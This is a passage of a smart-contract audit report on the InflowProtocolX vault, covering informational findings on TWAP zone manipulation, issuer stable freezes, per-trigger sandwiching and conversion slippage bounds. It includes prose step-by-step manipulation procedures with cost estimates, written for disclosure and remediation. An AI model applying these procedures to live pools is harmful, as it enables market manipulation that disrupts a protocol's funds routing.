## Description

The ArbitrageMonitor's live-TWAP confirmation is satisfied by a large price dislocation held for a few percent of the span, not for the half-window its NatSpec gives as the cost of faking it. A third party can therefore force a false EMERGENCY or STABLE_CHEAP zone far more cheaply than documented. A false EMERGENCY zeroes the WPLS conversion leg for the cycle it lands on and, if it still reads EMERGENCY when deployment re-reads the zone, the WPLS liquidity leg and every rail and treasury slice of that cycle as well.

With the oracle wired, `ArbitrageMonitor.getZone()` returns a zone only when two readings agree. The spot reading must show a gap of at least 3%, and the live TWAP reading from `_twapZone()` must confirm the same cheap side at `ARB_NEUTRAL_BPS` (1.8%). `_twapZone()` compares the arithmetic mean of the side that must read cheap with the harmonic mean of the side that must read dear, each averaged from the base set's last pin to now. `_liveSpansUsable()` bounds only the span's length (at least W/2, at most 1.25W) and how far apart its three start times may lie. Nothing bounds the share of the span the dislocation has to cover.

That share is small. With priceA at 0.5x and priceB at 2x for a fraction t of the span, hmB/amA = 1/(1 - 0.5t)^2, which reaches 1.018 at t of about 1.8%. At W = 1h, with a span between W/2 and 1.25W, that is about 32-80 seconds, or four to eight blocks at PulseChain's 10-second block time. The hold needed grows with the span at the moment of the read: a hold of about 64 seconds keeps confirming up to a full window. A same-block move does not count, because the current block's reserves get no weight in the cumulative (`TWAPOracle._currentCumulatives()`). The hold therefore has to straddle block boundaries.

Two NatSpec passages state a cost the code does not impose: `ArbitrageMonitor.sol:44-47` ("the dislocation has to be held against arbitrage for at least half a window") and `ArbitrageMonitor.sol:136-141` (half a window "keeps the cost of faking the TWAP leg at holding the move against arbitrage for an hour"). A third passage, `ArbitrageMonitor.sol:56-61`, is right in its narrow claim that a spike held for one block cannot confirm: at W = 1h one 10-second block is at most about 0.56% of a span of at least W/2, which moves the ratio by at most about 1.1%, whatever the spike's size. Its closing words, "only a move held for a real share of the span confirms a zone", are loose, because about 1-2% of the span is enough.

A cheaper route exists in quiet markets. The contract itself notes that "Arbitrage cannot close a gap under roughly two swap fees plus the sell tax" (`ArbitrageMonitor.sol:32-33`). The arbitrageur also pays the 0.5% buy tax, so an arbitrageur holding inventory, who trades only the two IPX pools, closes any gap above about 1.6%, while one who must close the loop through WPLS/stable pays a third 0.29% fee and stops at about 1.87-1.89%. The 1.8% confirmation threshold therefore sits inside the no-arbitrage band only against the closed-loop arbitrageur, and then by 7-9 bps. Ordinary routed flow also erodes the gap, since routers send buyers to the cheap pool and sellers to the dear one. A confirming gap held for W/2 is therefore close to free only while no inventory arbitrageur is active and organic flow is light. Separately, because the attacker sets the 3% spot leg atomically in the triggering transaction, any existing live gap of 1.8% or more lets them force the zone for the cost of that one spot push.

With the base set's last pin between W/2 and 1.25W old, so that the live span is usable:

1. When the base set is about W/2 old, push IPX/WPLS to about 0.5x and IPX/stable to about 2x. The IPX/stable push is a buy and runs no cycle. The IPX/WPLS push is a taxed sell that runs the cycle, so it must land while the base set is younger than W: a cycle after the window has matured re-pins it in `VaultController._refreshTwapWindows()` and restarts the span.
2. Keep both pushes in place across about 4-8 block boundaries inside the span. The pushed reserves must be the block-final state of each pair at every boundary that is to count: an arbitrage back-run later in the same block restores the price before the boundary and removes that block's weight, so the attacker needs end-of-block placement on both pairs at each of those boundaries. Alternatively, hold a gap of about 1.8% for the whole span, subject to the arbitrage and flow limits above.
3. On each cycle while the held time is still at least about 1.8% of the span, move spot 3% inside the triggering transaction. `getZone()` returns EMERGENCY (or STABLE_CHEAP, with every push reversed). The zone is re-read after conversion and before deployment (`VaultController.sol:559-561`). For it to govern deployment too, the spot push must still exceed 3% after the conversion round's own swaps.

The README already accepts griefing of the same kind, bounded to one window: a seller may skip a rail for one window, or redirect one conversion round to WPLS per cooldown period without holding back the honest round behind it (`README.md:387-400`). A forced EMERGENCY is close to those residuals but not contained in them. Its round is complete rather than partial, so it starts the cooldown (`VaultController.sol:590-591`) and the window's round converts with no WPLS leg. If deployment also reads EMERGENCY, the WPLS liquidity leg is skipped and the whole stable budget goes to the IPX/USDC liquidity leg, so the rail and treasury slices are spent on base liquidity instead of staying in the vault, as a skipped rail's slice does. Until the first rail opens at a Total_POL of $50K (`InflowConstants.sol:248-252`), the allocation row is all-base in any zone (`LiquidityDeployer.sol:397-400`), and the skipped WPLS leg is the only change EMERGENCY makes to deployment.

## Location of Affected Code

Only the span length is checked:

File: [src/ArbitrageMonitor.sol#L479-L488](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ArbitrageMonitor.sol#L479-L488)

```solidity
uint32 nowTs = uint32(block.timestamp);
uint32 shortest;
uint32 longest;
// uint32 timestamps wrap by design, as in the oracle.
unchecked {
    shortest = nowTs - latest;
    longest = nowTs - earliest;
}
if (shortest < window / LIVE_MIN_SPAN_DIVISOR) return false;
return longest <= window + window / LIVE_GRACE_DIVISOR;
```

Confirmation at the 1.8% neutral threshold on arithmetic versus harmonic means:

File: [src/ArbitrageMonitor.sol#L435-L441](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ArbitrageMonitor.sol#L435-L441)

```solidity
if (hmB > amA) {
    deviationBps = ((hmB - amA) * InflowConstants.BPS_DENOMINATOR) / amA;
    zone = _zoneOf(amA, hmB, deviationBps, InflowConstants.ARB_NEUTRAL_BPS);
} else if (hmA > amB) {
    deviationBps = ((hmA - amB) * InflowConstants.BPS_DENOMINATOR) / amB;
    zone = _zoneOf(hmA, amB, deviationBps, InflowConstants.ARB_NEUTRAL_BPS);
}
```

The cost the span bound is meant to impose:

File: [src/ArbitrageMonitor.sol#L136-L142](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ArbitrageMonitor.sol#L136-L142)

```solidity
/// @dev The live reading must span at least `windowSeconds / 2`. A
///      shorter span lets a spot move held for a few blocks carry real
///      weight; half a window keeps the cost of faking the TWAP leg at
///      holding the move against arbitrage for an hour at the default
///      two-hour window. The accepted consequence: no zone can fire in
///      the first half of each window, which fails closed.
uint256 internal constant LIVE_MIN_SPAN_DIVISOR = 2;
```

The confirmation threshold:

File: [src/InflowConstants.sol#L317](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/InflowConstants.sol#L317)

```solidity
uint256 internal constant ARB_NEUTRAL_BPS   = 180; // <1.8% neutral
```

## Impact

A false EMERGENCY always zeroes the WPLS conversion leg (`ConversionModule.sol:339-340`) of a round that still starts the cooldown. If the zone still reads EMERGENCY at deployment, the WPLS liquidity leg is skipped and its WPLS stays in the vault; once rails or the treasury are active, their slices go into IPX/USDC liquidity instead (`LiquidityDeployer.sol:327-329`, `387-389`). A false STABLE_CHEAP only sends the conversion residual to IPX/WPLS, which is milder. Each forced zone misroutes one cycle; the next honest cycle uses the normal allocation. Only if it were repeated every window would it approach the outcome the monitor's own NatSpec warns about, "permanently stalling the POL ladder" (`ArbitrageMonitor.sol:233-243`). Funds are not lost: zones affect routing only, the diverted stable becomes base IPX/stable POL and the WPLS stays in the vault.

At launch depth, with $12,800 in IPX/WPLS and $7,200 in IPX/USDC (`docs/LAUNCH_PLAYBOOK.md:148-149`), the multi-block spike costs about $5K-$10K per attempt: each block that arbitrage reverts costs about 6% of each pushed pool's value, about $1,200 across both, and an attempt needs four to eight such blocks. At that depth, there is no rail or treasury slice to divert. They open only once POL reaches $50K, when the base pools alone hold about that much and the same spike costs roughly $12K-$24K per attempt, rising further with depth. Holding a 1.8% gap is close to free only while no inventory arbitrageur or organic flow closes it, and the TWAP leg then confirms a gap that does exist on average. In neither case does faking the TWAP leg cost what the NatSpec assumes: about 32-80 seconds of a held move at the playbook's one-hour window, against the half window the NatSpec states.

This is Informational. The attacker gains nothing, and each forced zone misroutes a single cycle inside the protocol, griefing of the same kind as the rail skips and conversion redirects the README accepts (`README.md:387-400`), which a seller can cause far more cheaply. Forcing it costs $5K-$10K per attempt at launch depth and more once rails exist, needs end-of-block placement on both pools across four to eight block boundaries and a win of the post-cooldown trigger against honest sellers and the keeper's `poke()`, and each EMERGENCY round itself sells into IPX/USDC and narrows the gap. What remains is that the NatSpec documents a manipulation cost the code does not impose, and that the 1.8% confirmation threshold sits inside the band arbitrage leaves open.

## Recommendation

Correct the cost claims at `ArbitrageMonitor.sol:44-47` and `136-141`, and the "real share of the span" wording at `56-61`: a large move held for about 1.8% of the span confirms a zone, and a gap of about 1.8% that arbitrage leaves open confirms for the whole span.

If the half-window cost is meant to hold, no choice of mean or threshold alone can deliver it. A spike that drives priceA toward zero and priceB without bound for a share t of the span moves hmB/amA to 1/(1 - t)^2, so at a confirmation threshold θ about θ/2 of the span is enough, and about θ with the 0.5x/2x pushes above. The hold grows only when the confirmation covers more time, and every extension also delays the genuine signal.

Confirm a zone with both the pinned completed-window mean and the live mean, each built from the same arithmetic and harmonic means. The attacker must then dislocate the last completed window, at least W long, as well as the live span, which roughly doubles or triples the hold, and a gap that closed before the last pin still cannot confirm on its own because the live mean and spot must agree. The cost is lag: a genuine dislocation confirms only once it fills enough of a completed window, so the EMERGENCY response, the crash defence the zone exists for, can engage up to about one window later than today. Scaling the threshold by `window / span` instead only removes the cheaper short-span case (the hold becomes about 1.8% of a window at every span) and delays confirmation of a genuine gap early in each window; it does not change the order of magnitude.

Size `ARB_NEUTRAL_BPS` and the spot threshold by simulation, accounting for the no-arbitrage band, so that a gap an inventory arbitrageur leaves open cannot confirm for free. A higher TWAP threshold has a cost: it lets a genuine dislocation read under the threshold on average, which is why the TWAP leg was held to the neutral margin (`ArbitrageMonitor.sol:220-226`). It also lengthens the spike route's hold only in proportion, so it narrows the quiet-market route far more than the spike route.

## Team Response

Fixed.

# [I-06] An Issuer Freeze, Pause or Blacklist on the Stable Reverts Every Eligible Cycle Until a Timelocked Wallet Change or a Migration

## Severity

Informational Risk

## Description

The cycle moves the stable with hard calls inside one atomic transaction, so an issuer-side freeze, pause or blacklist reverts every eligible cycle. Deployment then stops until the issuer lifts the restriction, a time-locked treasury-wallet change executes, or a 30-day migration completes, and conversion and expansion stop with it. In the treasury-wallet case, the owner can restart conversion at once by making deployment place nothing; in the paused-stable case, nothing short of the issuer or a migration helps.

None of these triggers exists on the launch stable. The deploy script defaults to bridged USDC (`InflowConstants.sol:341-343`, `script/Deploy.s.sol:94`), a bridge token whose issuer cannot pause it or freeze addresses (`M3_DELIVERABLE.md:151`). The behaviour below becomes reachable only after the owner migrates the vault to a stable whose issuer holds those powers, which the migration path explicitly supports (`README.md:267`).

The cycle is atomic by design. `_runCycle()` reverts as a whole when a submitted conversion leg fails or when `LiquidityDeployer.deploy()` reverts, and `lastExecutionTime` is written only after a successful cycle (`VaultController.sol:590-591`). `IPXToken._update()` catches the revert and emits `CycleFailed`, so the user's sell settles, but the cooldown never advances and every following trigger retries and fails in the same way. The migration path already treats an unusable stable as a token-level condition, and its own comment names migration as the remedy: "Migration is the escape route from an unusable stable, so a stable that pauses or blacklists must not be able to block it", and `handoffTo()` sends the stable through `_tryTransferStable()` and carries on if it fails (`VaultController.sol:897-907`). The migration playbook likewise lists a stable outage as the reason for a new-stable migration (`MIGRATION_PLAYBOOK.md:77-78`). The two cycle-side dependencies below have no such tolerance.

### 1. A treasury wallet that cannot receive the stable reverts every deployment cycle

Once the treasury stage is active, row 5 of the deployer's allocation table gives the treasury a 4% slice (`treasuryBps = ALLOC_TREASURY_BPS = 400`), and `LiquidityDeployer.deploy()` pays it with `withdrawTo(stable, treasuryPaid, treasuryWallet())` whenever the round placed any liquidity. `VaultController.withdrawTo()` performs a plain `safeTransfer()` (`VaultController.sol:761-768`), and `_runCycle()` calls `deploy()` without a `try` (`VaultController.sol:574-579`). A transfer failure that concerns only the external payee therefore rolls back conversion, expansion and every LP placement before `lastExecutionTime` is written. A plain ERC20 transfer runs no code on the recipient, so the wallet cannot refuse a standard stable on its own; the failure needs the issuer to freeze or blacklist it.

The remedy is to replace the wallet through `TreasuryController.queueTreasuryWalletChange()`, wait `treasuryWalletTimelock`, and call `executeTreasuryWalletChange()`. The timelock is immutable, at least 24 hours (`MIN_TREASURY_WALLET_TIMELOCK`), 48 hours in the deploy script (`script/Deploy.s.sol:62`), and has no upper bound. No owner switch skips the payout in the meantime: `setExpansionEnabled()` does not gate it, the LiquidityDeployer has no toggle, and its `treasuryController` is immutable. The owner can restart conversion at once, without a timelock, by making every deploy leg place nothing: point the deployer's reserve wallet at an empty address (`LiquidityDeployer.setReserveWallet()`) and disable expansion, which also stops the rail contributions that draw IPX from the expansion module's own reserve wallet (`ExpansionModule.sol:535`). With `placedUsd` at zero, no treasury transfer is attempted (`LiquidityDeployer.sol:281`), so conversion runs again and only deployment waits for the timelock.

### 2. A paused or blacklisting stable is treated as caller griefing and reverts every converting cycle

`ConversionModule._swap()` reports any router revert as `LegResult.Failed` (`ConversionModule.sol:510-521`), which the `LegResult` comment (`ConversionModule.sol:306-312`) defines as "the one outcome a third party can cause from outside the module". A seed or stable leg whose output cannot be delivered because the stable is paused or because the receiving VaultController or the sending IPX/stable pair is blacklisted therefore comes back as `Failed`, and `execute()` sets `complete = false` (`ConversionModule.sol:267-268` and `278-281`). `_runCycle()` then reverts with `IncompleteConversion`, on the premise that a failed submitted leg means the caller controlled the outcome. The revert also undoes the WPLS fill and the expansion work done in STEP 4. The only exception is a stable-cheap round that sets nothing aside for the seed, which plans no stable-side leg at all (`ConversionModule.sol:345`, `430-438`). That is the case when the seed bucket is at (or within $0.01 of) its target, when the stage is 4 or higher and allocates no seed (`InflowConstants.sol:308-313`), or when no expansion module is wired.

No attacker is needed:

1. The issuer pauses the stable, or blacklists the VaultController or the IPX/stable pair.
2. The next cycle with the cooldown elapsed, D at or above the threshold and no momentum block submits a seed or stable leg, and the router reverts.
3. The cycle reverts with `IncompleteConversion`, and the same happens on every eligible trigger until the restriction is lifted or the vault migrates. The only escape that tolerates a failing stable is the VaultController migration, which takes 30 days and, unless only the vault itself was blacklisted, must move to a new stable (`README.md:267`): a successor on the same stable still trades a paused token through the same IPX/stable pair.

## Location of Affected Code

The treasury cut is pushed to the wallet inside `deploy()` through `withdrawTo()`'s hard `safeTransfer()`:

File: [src/LiquidityDeployer.sol#L279-L294](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol#L279-L294)

```solidity
uint256 treasuryPaid;
uint256 plannedUsd = deployUsd - plan.treasuryUsd;
if (plan.treasuryUsd > 0 && placedUsd > 0 && plannedUsd > 0) {
    uint256 earnedUsd = placedUsd >= plannedUsd
        ? plan.treasuryUsd
        : (plan.treasuryUsd * placedUsd) / plannedUsd;
    uint256 stableSurplus = IVaultController(vaultController).getStableSurplus();
    treasuryPaid = earnedUsd <= stableSurplus ? earnedUsd : stableSurplus;
    if (treasuryPaid > 0) {
        IVaultController(vaultController).withdrawTo(
            stable,
            treasuryPaid,
            ITreasuryController(treasuryController).treasuryWallet()
        );
    }
}
```

A failed seed or stable leg, including a token-level stable failure, reverts the whole cycle as if the caller had caused it:

File: [src/VaultController.sol#L542-L547](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L542-L547)

```solidity
(ipxConverted, complete, partialRound) = IConversionModule(conversionModule).execute(convRate, arbZone);
// A submitted leg that failed means the caller controlled which
// destination received work. Reject the entire attempt so all
// earlier fills roll back and no partial round can consume the
// shared cooldown.
if (!complete) revert IncompleteConversion();
```

## Impact

From the moment the issuer freezes the treasury wallet, every full round that clears the deploy threshold and places any liquidity reverts, and deployment and rail funding stop for at least 24 hours (48 hours as deployed) plus the operator's reaction time; conversion stops with them unless the owner switches deployment off as described above. Partial and EMERGENCY rounds pay no treasury slice and still run. Rounds that convert while fundable USD is below the deploy threshold also still complete, but conversion raises fundable USD and the blocked deployment cannot lower it, so the halt sets in once it reaches the threshold. A paused or blacklisting stable halts conversion, deployment and seed funding until the issuer lifts the restriction or a migration completes. In both cases, a failed cycle never blocks the user's sell, because the token's `try`/`catch` absorbs it (`IPXToken.sol:437-440`), and no funds are lost: the halt ends once the wallet is replaced, the stable recovers or the vault migrates.

This is Informational. Neither case can occur as deployed: the launch stable has no pause, blacklist or freeze control, so both need the owner first to migrate, through the 30-day timelock, to a stable whose issuer has one, and the issuer then to pause the token or act against the vault, the IPX/stable pair or the treasury wallet. Even then, the cost of failing hard is narrow. A paused stable, a blacklisted vault or a blacklisted IPX/stable pair makes the stable unusable for the protocol, the case the code names migration as the escape route for. The stable-side legs cannot run through the protocol's pairs in that state under any rule, and the second fix below would recover only WPLS conversion, one partial round per cooldown period, with no deployment. A frozen treasury wallet leaves the stable usable, but the owner can restart conversion at once and replace the wallet within the treasury timelock, so only deployment waits. No funds are at risk in either case. The issue is a robustness gap to close before any migration to an issuer-controlled stable, not a risk to the launch deployment.

## Recommendation

The launch deployment needs no change; both matter before a migration to a stable whose issuer can pause it or freeze addresses.

1. Make the treasury payout tolerant: attempt the transfer and, if it fails, leave the slice in the vault as stable surplus and emit an event. Alternatively, accrue the slice in the vault and let the treasury pull it. An accrued slice must then be excluded from `getStableSurplus()` and `seedWithdrawable()` the way the protected seed is, or later rounds would redeploy it, and `handoffTo()` must carry or settle it at migration.
2. Distinguish a token-level stable failure from a pair-lock failure before deciding. The lock is the reliable test: on a Uniswap V2 pair, `sync()` is guarded by the same lock as `swap()` and transfers nothing, so a `sync()` on the IPX/stable pair that succeeds after a failed seed or stable leg shows that the failure was not the flash-swap case. It only absorbs an unsynced balance, which anyone can do at any time. A zero-value transfer of the stable to the vault is a weaker probe. It reveals a pause or a blacklisted vault, but not a blacklisted IPX/stable pair, which sends the swap output, and a stable that rejects zero-value transfers would read as frozen on every failure, routing the locked-pair case into the degraded path.

   On a token-level failure, degrade to a WPLS-only round that starts with no cooldown, through the existing partial-round accounting (`lastPartialRoundAt`, at most one per `COOLDOWN_PERIOD`), so the degraded round gives a seller nothing the accepted IPX/USDC push (`README.md:394-400`) does not already give. Such a round is partial, so it deploys nothing (`VaultController.sol:574`); with a paused stable, the deploy's stable legs could not run anyway, so this restores WPLS conversion only, one round per cooldown period.

   Two other paths must agree with it. STEP 4 withdraws a rail seed in the same stable (`ExpansionModule.sol:706`), and `_runCycle()` calls `checkExpansion()` without a `try`, so while a seed clears its preflight, a paused stable or a blacklisted vault still reverts every cycle before conversion runs. The operator must disable expansion (`setExpansionEnabled(false)`) for the duration, or that withdrawal must tolerate the failure as well. And if the partial-round deployment proposed in I-07 is adopted, it must not apply to a degraded round, because the stable legs, rail contributions and treasury payout of `deploy()` would revert on the same stable.

   The fail-hard rule itself is deliberate: it stops a seller from steering a round's destinations by selling from inside a locked pair's flash-swap callback (`README.md:369-377`), so a naive change that treated every failed stable leg as harmless would reopen that path. If the halt is accepted instead, record it with the other new-stable requirements in the migration playbook, which already warns that a fee-on-transfer stable halts conversion, deployment and expansion on every attempt (`MIGRATION_PLAYBOOK.md:88`): a stable whose issuer can pause it or freeze the vault, the IPX/stable pair or the treasury wallet halts them in the same way.

## Team Response

Fixed.

# [I-07] An IPX/Stable Push Held at Every Cycle Trigger Forces Partial-Then-Deferred Rounds and Starves Seed Funding and Deployment

## Severity

Informational Risk

## Description

An attacker who sandwiches every cycle trigger with a buy and a sell on IPX/stable keeps every conversion round partial or deferred. As long as the attacker keeps this up, the protected seed receives no new funding and `deploy()` never runs. A rail that still waits on its seed, or on POL growth, cannot open.

The ConversionModule declines a stable-side leg (the seed leg or the residual stable leg) when spot is more than `maxLegDeviationBps` away from TWAP, 10% by default. It credits the seed only when the seed leg fills. A round whose stable side declines while its WPLS leg fills runs as a WPLS-only partial round. For one `COOLDOWN_PERIOD` after that round, any later round whose stable side would still decline is deferred and converts nothing. After a partial or deferred round, the VaultController deploys nothing and starts no cooldown.

Nothing else catches the push. It is a buy, so it runs no cycle. The momentum check reads only IPX/WPLS, and the manipulation guard reads only WPLS/stable. The arbitrage zone needs live-TWAP confirmation, which a single-block push does not provide.

The README describes this pattern for a single push and states its bound: "A seller can therefore redirect at most one round to WPLS per cooldown period, and cannot hold back the honest round behind it" (`README.md:394-400`). Both halves hold for a single push. The README does not consider an attacker who brackets every trigger, meaning every taxed sell and every keeper `poke()`, for example through mempool ordering. Against that attacker, the first half still holds, since at most one round per period goes to WPLS, but the honest round behind the push never arrives while the attack lasts:

1. Before the trigger, buy IPX on IPX/stable until spot is more than 10% above TWAP. This takes about 5% of the pool's IPX reserve, and the buy runs no cycle.
2. The victim's cycle runs a WPLS-only partial round if it is the first in the period, or a `RoundDeferred` round otherwise. Either way, the seed is not credited and `deploy()` does not run.
3. Sell the IPX back. That sell's own cycle runs before its IPX reaches the pool, while the pool is still being pushed, so it defers as well.
4. Repeat for every trigger.

The attack applies while D is above the stage's convert threshold and the planned round has a stable side, either a seed leg (while the seed is below target) or a residual stable leg. A partial or deferred round starts no cooldown, so every taxed sell and every `poke()` is a new trigger that the attacker must bracket. Any trigger the attacker misses runs a normal round.

## Location of Affected Code

A stable-side leg declines when spot is off its TWAP band:

File: [src/ConversionModule.sol#L556-L558](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol#L556-L558)

```solidity
if (spotOut == 0 || twapOut == 0) return (false, spotOut, twapOut, type(uint256).max, 0);
deviation = _deviationBps(spotOut, twapOut);
if (deviation > maxLegDeviationBps) return (false, spotOut, twapOut, deviation, 0);
```

The first declined round in a period becomes a partial round:

File: [src/ConversionModule.sol#L286-L297](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol#L286-L297)

```solidity
if (stableSideDeclined && ipxConverted > 0) {
    // The pre-check passed but a stable-side leg still declined,
    // e.g. once the seed leg's own impact moved the pool. Past the
    // cap that is a second partial round this period: report the
    // round incomplete so the vault rolls it back.
    if (partialUsed) {
        complete = false;
    } else {
        partialRound = true;
        lastPartialRoundAt = block.timestamp;
        emit PartialRound(ipxConverted);
    }
```

Later rounds in the same period convert nothing:

File: [src/ConversionModule.sol#L238-L246](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol#L238-L246)

```solidity
uint256 stableSide = legs.seed + legs.toStable;
bool partialUsed = _partialRoundUsed();
if (stableSide > 0 && partialUsed) {
    (bool stableOk,,,,) = _legQuote(stableSide, stable);
    if (!stableOk) {
        emit RoundDeferred(legs.total);
        return (0, true, false);
    }
}
```

A partial round never deploys:

File: [src/VaultController.sol#L574-L578](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L574-L578)

```solidity
if (getFundableUsd() >= activeDeployThreshold() && ipxConverted > 0 && !partialRound) {
    // Defensive no-capacity/preflight conditions return false. An
    // actual submitted-leg revert bubbles so conversion, expansion,
    // every earlier placement and the cooldown roll back together.
    deployed = ILiquidityDeployer(liquidityDeployer).deploy(D, arbZone);
```

## Impact

As long as the attacker brackets every trigger, the protected seed receives no new funding and `deploy()` never runs. A rail that still waits on its seed, or on POL growth, cannot open. The README's "cannot hold back the honest round behind it" holds only for the single push it describes. It does not cover a sustained per-trigger sandwich of the conversion legs, while its bound of one WPLS round per period still holds.

No funds are lost. Each trigger costs the attacker at least about 1% of the pushed amount in IPX tax, which goes to the vault, plus about 0.58% in swap fees. That is roughly 0.07% of the pool's IPX side per trigger. Anyone can add a trigger for the cost of a 200-wei taxed sell, and any trigger the attacker misses runs a normal round. A keeper that pokes in every block forces one bracket per block. At PulseChain's 10-second blocks, that is about 180 brackets per 30-minute cooldown period, burning roughly 13% of the pool's IPX side per period. The protocol recovers as soon as the attacker stops.

The momentum gate already exposes the same outcome (see I-09). A buy on IPX/WPLS placed ahead of a trigger skips that cycle's whole conversion, seed leg included, and with it deployment. It therefore starves seed funding and deployment exactly as this push does, and also holds back the WPLS leg that this push lets through once per period. It costs about 0.04% of the IPX/WPLS pool's IPX side per trigger. At the launch depths of 64M IPX in IPX/WPLS and 36M IPX in IPX/USDC (`README.md:154-155`), that is roughly 24,000 IPX per trigger, against roughly 26,000 IPX for the push described here. This route gives an attacker no reach it does not already have; what it adds is a README guarantee that is stated more broadly than the code delivers.

This is Informational. While it lasts, it holds back seed funding and deployment, but no funds are lost or locked and nothing persists once the attacker stops. The attacker gains nothing, pays for every bracket at a loss, and has to win transaction ordering on both sides of every trigger, keeper pokes included, because a single missed trigger runs a normal round that credits the seed and deploys as usual.

## Recommendation

Allow a partial round to deploy once conversion has been starved for a whole `COOLDOWN_PERIOD`, and record that deployment in a separate deploy timer so that the one-deploy-per-cooldown rule still holds while conversion stays open. The starvation condition has to be stated against partial rounds, not against the cooldown. Every round, partial or full, already runs only after the cooldown has expired (`VaultController.sol:529`, `1474-1477`), so "a whole period without a full round" is true of every partial round. Read that way, the single push the README describes would make its WPLS-only round deploy, with the IPX/stable add declined, and the deploy timer would then deny deployment to the honest round behind it, which is what `VaultController.sol:586-589` and the README rule out. A condition that matches the attack is that a previous partial round exists and no full round has run since it: read `lastPartialRoundAt` before calling `execute()`, and require it to be non-zero and `lastExecutionTime` to be older than it. Partial rounds are already capped at one per period (`ConversionModule.sol:238-246`), so these deployments are too. A full round must then also respect the deploy timer, so that a full round straight after a partial-round deployment converts without deploying again; set the timer only when `deploy()` actually placed capital. Honest operation then changes only after two consecutive partial rounds with no full round between them. While the pool stays pushed, that deployment still declines the IPX/stable add at the deployer's 5% TWAP guard (`LiquidityDeployer.sol:539-543`).

Scope this together with the second fix proposed in I-06. That fix degrades a round whose stable fails at token level (a paused stable or a blacklisted vault) to a WPLS-only partial round, and relies on partial rounds never deploying. Under the rule above, the second such round would deploy, its stable leg, rail contributions and treasury payout would revert on the stable, and the cycle would roll back on every trigger, bringing back the halt I-06 removes. Allow the partial-round deployment only when the stable side was declined by the band check, never after a token-level stable failure.

This restores deployment but not seed funding, because the seed leg still needs IPX/stable inside its band. If seed funding must also survive the attack, the seed leg needs a fallback that does not depend on IPX/stable alone, for example, selling through IPX/WPLS and the WPLS/stable anchor under the same band checks. Such a fallback needs a TWAP band check on each hop, must count its IPX toward `wplsLegCap`, and must keep crediting the seed from the vault's measured stable balance (`ConversionModule.sol:258-266`). Its second hop is a protocol sale on the anchor, which the post-conversion guard re-reads (`VaultController.sol:553-554`), so it must stay small against that pool. Like the deployment above, it should run only after a band decline, not a token-level stable failure, where its second hop would fail as well. The attacker's push decides when the fallback runs, so the fallback is in turn exposed to pushes on those pools.

Against an attacker willing to pay per trigger, these changes keep seed funding and deployment running only if the momentum-gate route in I-09 is fixed as well. That route skips conversion altogether, so no partial round runs for the rule above to deploy from, and no seed leg is attempted for a fallback to replace. While that route stays open, correcting the README is the proportionate fix for this one.

In either case, correct `README.md:394-400` to cover the per-trigger sandwich case.

## Team Response

Fixed.

# [I-08] Conversion Sells Are Bounded Only by the TWAP Deviation Band, and the Seller Who Triggers a Round Trades After Them

## Severity

Informational Risk

## Description

Both the vault's conversion legs and the taxed sell that triggers them can fill worse than the `minOut` comment or a pre-trade quote suggests.

### 1. Conversion legs are bounded only by the TWAP band; the same-frame `minOut` never binds

`_legQuote()` sets `minOut = expected * (1 - minSlippageBps)` with `expected = min(spotOut, twapOut)`, where `twapOut` is the fee- and impact-adjusted TWAP output and `spotOut` is a router `getAmountsOut()` staticcall (`_spotAmountOut()`) in the same call as the swap `_swap()`, then submits (`ConversionModule.sol:505-516`). Nothing intervenes: with `inSwap` set by the cycle (`VaultController.sol:416`), the IPX transfer into the pair is untaxed (`IPXToken.sol:409`) and starts no nested cycle (`IPXToken.sol:436`). The pair pays exactly the quote, so the floor always holds; its slack only absorbs output-side fees.

Only the deviation gate bounds the fill: spot output within `maxLegDeviationBps` (default 1000 bps, settable 0 to 2000 by `setMaxLegDeviation()`, `ConversionModule.sol:160-166`) of TWAP output. `_deviationBps()` divides by the TWAP (`ConversionModule.sol:574-580`), while `LiquidityDeployer._twapGuard()` (`LiquidityDeployer.sol:706-711`), the VaultController anchor guard (`VaultController.sol:1129-1131`) and the ExpansionModule gates (`ExpansionModule.sol:1359-1363`) use `min(spot, twap)`, a consistency difference only (90% vs about 90.9% of TWAP output at a 10% band). The owner's tax (`IPXToken.setTaxes()`), cap (`setConversionCap()`) and deviation bounds are never validated jointly. A third party can:

a. Wait for the cooldown to end (30 minutes; `lastExecutionTime` is public).

b. Push IPX/WPLS or IPX/stable down to just inside the band without completing a cycle, most cheaply by a sell whose own cycle fails and rolls back (from a flash-swap callback on a pair the cycle trades on, or gas-capped when the cycle is heavy enough; see I-09). A pair-to-pair hop also skips the cycle (`IPXToken.sol:436`) but pays both taxes on the push (`IPXToken.sol:410-411`) and moves a second pool to unwind, so it costs more than modelled.

c. Trigger the round with a dust-taxed sell, or sandwich the keeper's `poke()`: `_legCaps()` sizes the leg from the post-push `balanceOf(pair)` (`ConversionModule.sol:472-478`), it passes the band, and the vault sells up to `capBps` of the pool's IPX at the depressed price.

d. Buy back.

